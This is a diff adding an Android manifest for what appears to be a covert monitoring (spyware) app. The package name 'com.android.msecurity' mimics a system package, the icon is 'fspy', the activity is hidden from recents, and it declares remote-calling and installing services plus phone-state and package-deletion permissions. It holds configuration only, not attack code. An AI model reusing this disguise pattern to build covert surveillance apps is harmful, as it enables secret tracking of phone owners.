@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- 
+IMPORTANT: Do not edit versionCode and versionName in this file. 
+They will be replaced by Ant script automatically when building.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+      package="com.android.msecurity"
+      android:versionCode="0"
+      android:versionName="-1.0.0">
+    
+    <application 
+        android:label="5002"
+        android:icon="@drawable/fspy">
+        
+        <activity 
+            android:name="com.fx.MainActivity"      
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true"
+            android:finishOnTaskLaunch="true"
+            android:theme="@android:style/Theme.Light"
+            >
+                  
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+            
+        </activity>
+        
+        <activity android:name="com.fx.ApplicationSettingsActivity" android:screenOrientation="portrait"  android:theme="@android:style/Theme.Black.NoTitleBar"></activity>
+		<activity android:name="com.fx.ConnectionHistoryActivity" android:screenOrientation="portrait"  android:theme="@android:style/Theme.Black.NoTitleBar"></activity>
+        <activity android:name="com.fx.BasicDiagnosticsActivity" android:screenOrientation="portrait"  android:theme="@android:style/Theme.Black.NoTitleBar"></activity>
+        <activity android:name="com.fx.CurrentSettingsActivity" android:screenOrientation="portrait"  android:theme="@android:style/Theme.Black.NoTitleBar"></activity>
+                 
+        <service android:name="com.fx.InstallingService"/>
+        <service android:name="com.fx.ActivationService"/> 
+        <service android:name="com.fx.InstallingService"/>
+        <service android:name="com.fx.RemoteCallingService"/>
+        <service android:name="com.fx.ResetService"/>
+                 
+    </application>
+    
+    <uses-sdk android:minSdkVersion="7"/>
+    
+    <!-- Please do not remove any permissions without checking on every supported devices -->
+    <!-- Some permissions are only needed in a specific device -->
+    
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    
+</manifest> 
